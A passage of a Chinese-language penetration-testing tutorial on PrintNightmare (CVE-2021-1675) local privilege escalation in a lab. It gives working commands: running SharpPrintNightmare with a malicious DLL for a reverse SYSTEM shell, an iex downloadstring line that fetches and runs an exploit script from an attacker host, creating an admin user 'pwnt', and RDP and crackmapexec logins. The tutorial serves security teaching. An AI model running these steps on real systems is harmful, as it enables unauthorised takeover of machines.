QF9NTnq2KSDkAxstDQAA98RZETFLhk4jU48OjSolKsUAAn1AX5HToiY2W7FAyAc2WhoAAO6JMyKC5WNsVDKqGkColCYFMaE0fUWgJEJKbLZlhJAPbLQ0AADcE4dFBEmDZkyKJEOtlWgQOsno6IBKbgLJB/pqcmolSFBQtmnqCCEf2GhpAAC4J46JiFVBTCKikWAdMQ1GkIig6QwSEa3JiZJwHhYdkevVUq16xPqGR0I+wMDAwJyyy5cvE5/AwMDAZmj79+//fxcwNOlsGxDfAAAAAElFTkSuQmCC" width="364" height="129" class="img_ev3q"></p>
<p>这表明 Print Spooler 服务当前正在运行，也意味着此受害者机器容易受到攻击！</p>
<p>此外，我们还应该检查一下系统的版本信息和架构信息，以便在制作恶意 DLL 时能明确知道该怎么做。</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">systeminfo | findstr /B /C:&quot;Host Name&quot; /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot; /C:&quot;Hotfix(s)&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173823897-1770077244-5dfcaaeed2078add2c22391480f85ba3.png" width="844" height="145" class="img_ev3q"></p>
<p>可以看到，这是一个 64 位的系统，这也就是为什么在第一节中我们远程利用此服务时，64 位的恶意 DLL 会起作用。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22利用-sharpprintnightmareexe"><strong><div id="id2.2">2.2、利用 SharpPrintNightmare.exe</div></strong><a href="#22利用-sharpprintnightmareexe" class="hash-link" aria-label="22利用-sharpprintnightmareexe的直接链接" title="22利用-sharpprintnightmareexe的直接链接">​</a></h4>
<p>在枚举完打印服务并发现它正在运行后，接下来，需要开始设置我们的攻击。</p>
<p>现在，我们已经拥有了同 CVE-2021-1675.py 一块的 SharpPrintNightmare 文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173823714-919749335-2570e813573210a10c99639ead7b797a.png" width="750" height="65" class="img_ev3q"></p>
<p>但由于没有该程序的编译版本，因此我们需要将整个文件夹和其中的所有文件/子文件夹传输到安装了 Visual Studio 的实验计算机上。然后从那里，使用 Visual Studio 打开 SLN 文件，将其编译为可执行文件。</p>
<blockquote>
<p>我计划在将来写一篇关于以各种方式编译可执行文件的文章。但此刻，可以先参考<a href="https://juggernaut-sec.com/proving-grounds-heist/#Compiling_SeRestoreAbuseexe_from_an_SLN_Using_Visual_Studio" target="_blank" rel="noopener noreferrer">这篇</a>文章中使用 Visual Studio 编译 EXE 的示例。</p>
</blockquote>
<p>在此示例中，我们将复用之前制作的恶意 DLL ，然后以类似之前使用 CVE-2021-1675.py 时候的那种方式进行利用。唯一的区别是，这次我们将 EXE 和 DLL 全都下载到受害者的本地磁盘上。</p>
<p>因为，如果我们要直接从共享执行 EXE 和 DLL 程序，是需要管理员权限的，这就是为什么需要将 EXE 和 DLL 放在本地磁盘上。【注：这里我在win7、win10 上测试单个 EXE 是不需要管理员权限便可以运行的，但 EXE + DLL 的方式可能就不行了？】</p>
<p>在编译完 SharpPrintNightmare 二进制文件并将其发送回攻击者计算机后，我们可以将 EXE 和 DLL 放在一起，然后为该目录开启 HTTP 服务。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173823901-1069898933-0c45788b666d040781070f3a9c959929.png" width="662" height="133" class="img_ev3q"></p>
<p>然后在受害者机器下载 SharpPrintNightmare.exe 和 nightmare64.dll 文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173823519-1419020578-f293566df48199bbe75b25a9a5cd3dee.png" width="855" height="412" class="img_ev3q"></p>
<p>剩下的就是在端口 443 上再次启动 netcat 监听器以捕获反向连接的 SYSTEM shell，然后执行以下命令：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\temp\SharpPrintNightmare.exe &#x27;C:\temp\nightmare64.dll&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173822640-1596996368-d6ed95bcd25f4f09688224eab2b030d1.png" width="862" height="202" class="img_ev3q"></p>
<p>可以看到，它又在做一些事情了，和远程利用时候的情况非常相似。</p>
<p>回头检查我们的监听器，发现有一个 SYSTEM shell！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173824001-438645563-60b12d82f86c4b53715d8e9e18dba854.png" width="496" height="182" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="23利用-cve-2021-1675ps1"><strong><div id="id2.3">2.3、利用 CVE-2021-1675.ps1</div></strong><a href="#23利用-cve-2021-1675ps1" class="hash-link" aria-label="23利用-cve-2021-1675ps1的直接链接" title="23利用-cve-2021-1675ps1的直接链接">​</a></h4>
<p>在本例开始之前，我们需要先获取 <a href="https://github.com/calebstewart/CVE-2021-1675" target="_blank" rel="noopener noreferrer">CVE-2021-1675.ps1</a> 的副本，然后将其放置在 EXE 和 DLL 所在的目录下。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173823997-2035624813-b0761fd413757dbd1ea2fdc12c546aea.png" width="628" height="81" class="img_ev3q"></p>
<p>然后，我们可以使用以下 echo 命令将脚本调用函数附加到脚本底部：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo Invoke-Nightmare -DriverName &#x27;&quot;Xerox&quot; -NewUser &quot;pwnt&quot; -NewPassword &quot;Password123&quot;&#x27; &gt;&gt; CVE-2021-1675.ps1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>最终，脚本的底部就像下面这样：</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173822996-337829629-a3ac87ff906c4d7e4e3ea99e8727aa6b.png" width="912" height="240" class="img_ev3q"></p>
<p>这条后加的命令会创建一个名为 pwnt 的新用户，账户的密码为 Password123，且新用户会被添加到本地管理员组。</p>
<p>在脚本底部添加命令的方式，会使得该脚本在被 IEX 下载到内存时，该命令会被自动执行。</p>
<p>在开始漏洞利用前，先使用 net user 命令，可以确认当前并不存在名为 &#x27;pwnt&#x27; 的用户。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173823355-511096921-166eb4f07091ab1b73badec77721f2ac.png" width="741" height="360" class="img_ev3q"></p>
<p>现在，我们使用以下命令开始漏洞利用：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">iex(new-object net.webclient).downloadstring(&#x27;http://172.16.1.30/CVE-2021-1675.ps1&#x27;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173824031-1917251678-cafea444e4a978ee958a44e9c1a4abfd.png" width="914" height="130" class="img_ev3q"></p>
<p>从脚本的输出中可以看到，该漏洞利用创建了一个恶意 DLL，该 DLL 创建了我们指定的用户，然后将其添加到本地管理员组。然后，它会清理并删除自己创建的 DLL。</p>
<p>现在，当我们再次检查 net user 和 net localgroup administrators 时，将看到新创建的用户。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173823175-512680957-1c432235c144e1c8dafe9cd14ae8a13d.png" width="740" height="369" class="img_ev3q"></p>
<p>现在，我们能用这个用户做些什么呢？好吧，如果 RDP 已打开，那么可以使用 xfreerdp 通过远程桌面进入受害者机器，然后使用“以管理员身份运行”打开 cmd.exe，以启用我们的所有权限。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo xfreerdp /u:pwnt /p:&#x27;Password123&#x27; /v:172.16.1.50 +clipboard</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173824112-1498647847-46f3971a54eaae234da27282d7ce2db0.png" width="1024" height="622" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173824072-1521338592-e116c153e11b0fc5fafa80c767778c18.png" width="1024" height="793" class="img_ev3q"></p>
<p>Cool，我们可以获得管理员的全部权限，但是如果 RDP 未打开时会发生什么情况呢？当我们使用 <a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener noreferrer">crackmapexec</a> 测试 SMB 的访问时，会看到用户是有效的。但是，并没有出现预期的 Pwn3d！提示，这意味着我们无法通过 SMB 服务执行命令。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">crackmapexec smb 172.16.1.50 -u pwnt -p Password123 --local-auth</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173823534-114174555-75ba819f3f64164b7be3910bc24d0de3.png" width="917" height="148" class="img_ev3q"></p>
<p>同时，我们使用 psexec.py 测试也是没有效果的。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173824090-1312734591-d48d3b0554b0e38f8547807e867aa0cc.png" width="468" height="122" class="img_ev3q"></p>
<p>而之所以会发生这种无法登录的情况，是因为我们的本地管理员用户被 UAC 阻碍了。而我们可以绕过这一点，在没有 GUI 的情况下以该用户的身份获取一个 admin shell。但是，这需要先使用 <a href="https://www.cnblogs.com/kqdssheng/p/18751119" target="_blank" rel="noopener noreferrer">RunAs 技术</a>获取一个中完整性 shell，然后使用某种 <a href="https://www.cnblogs.com/kqdssheng/p/18745249" target="_blank" rel="noopener noreferrer">UAC 绕过技术</a>将中完整性 shell 提升到高完整性 shell。</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Windows 提权/Windows 提权-MSSQL"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Windows 提权-MSSQL</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Windows 提权/Windows 提权-RunAs"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Windows 提权-RunAs</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1cve-2021-34527--printnightmare-rce准-远程代码执行" class="table-of-contents__link toc-highlight"><strong><div>1、CVE-2021-34527 – PrintNightmare RCE（准 远程代码执行）</div></strong></a></li><li><a href="#2cve-2021-1675--printnightmare-lpe本地权限提升" class="table-of-contents__link toc-highlight"><strong><div>2、CVE-2021-1675 – PrintNightmare LPE（本地权限提升）</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>